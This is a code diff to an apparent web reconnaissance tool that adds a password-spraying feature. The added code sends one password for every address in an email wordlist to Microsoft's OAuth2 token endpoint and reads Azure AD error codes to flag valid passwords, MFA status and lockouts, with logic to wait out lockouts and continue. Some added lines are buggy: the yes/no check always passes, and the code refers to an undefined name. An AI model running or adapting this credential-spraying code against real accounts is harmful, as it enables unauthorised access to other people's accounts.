@@ -4,10 +4,14 @@ from tools import export
 import requests
 import os
 import re
+import time
+from colorama import Fore, Style, init
 
 # Global variable
 session = requests.session()
 session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36'
+INFO, FAIL, CLOSE, SUCCESS = Fore.YELLOW + Style.BRIGHT, Fore.RED + \
+        Style.BRIGHT, Style.RESET_ALL, Fore.GREEN + Style.BRIGHT
 banner = r'''==========================================================
      _ _    _    _                        _           _
   __| | | _| | _| |_      _ __  _ __ ___ (_) ___  ___| |_
@@ -59,7 +63,7 @@ def valid_link(core_url: str, crawled_link: str) -> str:
 def get_all_link(link: str):
     """
     Used to get all links in current web page
-    :param link:
+    :param link
     :return: list_full_links, list_cloud_resource, list_web_resource
     """
     response = session.get(link).text
@@ -122,7 +126,8 @@ def option_panel():
 Option 1: Reconnaissance the targeted website
 Option 2: DNS Scanning
 Option 3: Extract data (HTML/TXT)
-Option 4: Exit
+Option 4: Password spraying
+Option 5: Exit
 '''
     from time import sleep
     from os import system
@@ -158,7 +163,7 @@ Option 4: Exit
 
                 open('1.txt', 'w')
                 os.system(
-                    f'python tools/cloud_enum.py -k {input_keyword} -b {input_brute} -m {input_mutation} -l 1.txt -t 10')
+                    f'python3 tools/cloud_enum.py -k {input_keyword} -b {input_brute} -m {input_mutation} -l 1.txt -t 10')
                 file = open('1.txt', 'r', encoding='utf8')
                 others_output = others_output + '\n' + file.read()
                 file.close()
@@ -174,8 +179,130 @@ Option 4: Exit
                 else:  # Print data here, input function here
                     export.main(list_urls, list_phones, list_emails, others_output)
                 return option_panel()
-            # ==============================================================
             elif option == 4:
+                counter = 0
+                lockout_counter = 0
+                input_emails = input('Input email wordlist (default wordlist/wordlist_emails.txt): ')
+                if input_emails == '':
+                    input_emails = os.getcwd() + '/wordlist/wordlist_emails.txt'
+                    lockout = input('Input lockout time (default is 1 secs): ')
+                    if lockout == '': lockout = 1
+                    timeout = input ('Input timeout (default is 1 secs): ')
+                    if timeout == '': timeout = 1
+                    password = input('Input password: ')
+                with open(input_emails) as input_emails:
+                    for line in input_emails:
+                        email_split = line.split()
+                        email = ' '.join(email_split)
+                        s = requests.session()
+                        body = 'grant_type=password&password=' + password + '&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=' + \
+                            email + '&resource=https://graph.windows.net&client_info=1&scope=openid'
+                        requestURL = "https://login.microsoft.com/common/oauth2/token"
+                        url_request = requests.post(requestURL, data=body)
+                        response = url_request.text
+                        valid_response = re.search('53003', response)
+                        account_doesnt_exist = re.search('50034', response)
+                        account_invalid_password = re.search('50126', response)
+                        account_disabled = re.search('The user account is disabled', response)
+                        valid_response1 = re.search('7000218', response)
+                        password_expired = re.search('50055', response)
+                        account_locked_out = re.search('50053', response)
+                        mfa_true = re.search('50076', response)
+                        mfa_true1 = re.search('50079', response)
+                        desktopsso_response = re.search('{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
+                        conditional_access = re.search('50158', response)
+                        if valid_response:
+                            counter = counter + 1
+                            b = SUCCESS + "Result - " + " "*1 + "VALID PASSWORD! [+]"
+                            print(SUCCESS + f"[+] {email:44} {b}" + CLOSE)
+                        if valid_response1:
+                            counter = counter + 1
+                            b = SUCCESS + "Result - " + " "*15 + "VALID PASSWORD! [+]"
+                            print(SUCCESS + f"[+] {email:44} {b}" + CLOSE)
+                        if account_doesnt_exist:
+                            b = " Result - " + " "*14 + "INVALID ACCOUNT! [-]"
+                            print(FAIL + f"[-] {email:43} {b}" + CLOSE)
+                        if account_disabled:
+                            b = "Result - " + " "*11 + "ACCOUNT DISABLED. [!]"
+                            print(INFO + f"[!] {email:44} {b}" + CLOSE)
+                        if account_locked_out:
+                            b = "Result - " + " "*13 + "LOCKOUT DETECTED! [!]"
+                            print(INFO + f"[!] {email:44} {b}" + CLOSE)
+                            lockout_counter = lockout_counter + 1
+                            if lockout:
+                                lock_time = lockout
+                            if lockout is None:
+                                lock_time = 1
+                                lockout = int(lock_time) * 60
+                            if lockout_counter == 3:
+                                print(FAIL + f'\n[WARN] Multiple lockouts detected.\n')
+                                con_proc = input("Would you like to continue the scan after the lockout period is over? (y/n) ")
+                                if con_proc == "y" or "Y":
+                                    print(
+                                        INFO + f"Waiting {lockout} seconds before continuing.")
+                                    lockout = lockout - 30
+                                    time.sleep(int(lockout))
+                                    print(info + f'\nContinuing scan in 30 seconds.')
+                                    time.sleep(int(30))
+                                    timeout_counter = 0
+                                    lockout_counter = 0
+                                elif con_proc == "n" or "N":
+                                    print(INFO + "Quitting.")
+                                    return option_panel()
+                                else:
+                                    print(
+                                        FAIL + f"\n[warn] Invalid input. Quitting.\n")
+                                    return option_panel()
+                        if desktopsso_response:
+                            a = email
+                            b = " Result -  Desktop SSO Enabled [!]"
+                            print(INFO + f'[!] {a:51} {b} ' + CLOSE)
+                        if account_invalid_password:
+                            a = email
+                            b = " Result - " + " "*10 + "Invalid Credentials! [-]"
+                            print(FAIL + f"[-] {email:43} {b}" + CLOSE)
+                        if password_expired:
+                            a = email
+                            b = " Result - " + " "*9 + "User Password Expired [!]"
+                            print(INFO + f"[!] {email:43} {b}" + CLOSE)
+                        if mfa_true:
+                            counter = counter + 1
+                            a = email
+                            b = "Result -   VALID PASSWORD - MFA ENABLED [+]"
+                            print(SUCCESS + f"[+] {email:44} {b}" + CLOSE)
+                        if mfa_true1:
+                            counter = counter + 1
+                            a = email
+                            b = "Result - MFA ENABLED NOT YET CONFIGURED [+]"
+                            print(SUCCESS + f"[+] {email:44} {b}" + CLOSE)
+                        if conditional_access:
+                            counter = counter + 1
+                            a = email
+                            b = "Result - Duo MFA or other conditional access [+]"
+                            print(SUCCESS + f"[!] {email:44} {b}" + CLOSE)
+                        if timeout is not None:
+                            time.sleep(int(timeout))
+
+                    if counter == 0:
+                        print(
+                            FAIL + '\n[-] There were no valid logins found. [-]' + CLOSE)
+                        print(
+                            INFO + f'\n[info] Scan completed at {time.ctime()}' + CLOSE)
+                    elif counter == 1:
+                        print(
+                            INFO + '\n[info] Discovered one valid credential pair.' + CLOSE)
+                        print(
+                            INFO + f'\n[info] Scan completed at {time.ctime()}' + CLOSE)
+                    else:
+                        print(
+                            INFO + f'\n[info] Discovered {counter} valid credential pairs.\n' + CLOSE)
+                        print(
+                            INFO + f'\n[info] Scan completed at {time.ctime()}' + CLOSE)
+                return option_panel()
+
+
+            # ==============================================================
+            elif option == 5:
                 print('-----------------------------\n[-] Exit the program!')
                 exit(0x0)
             else:
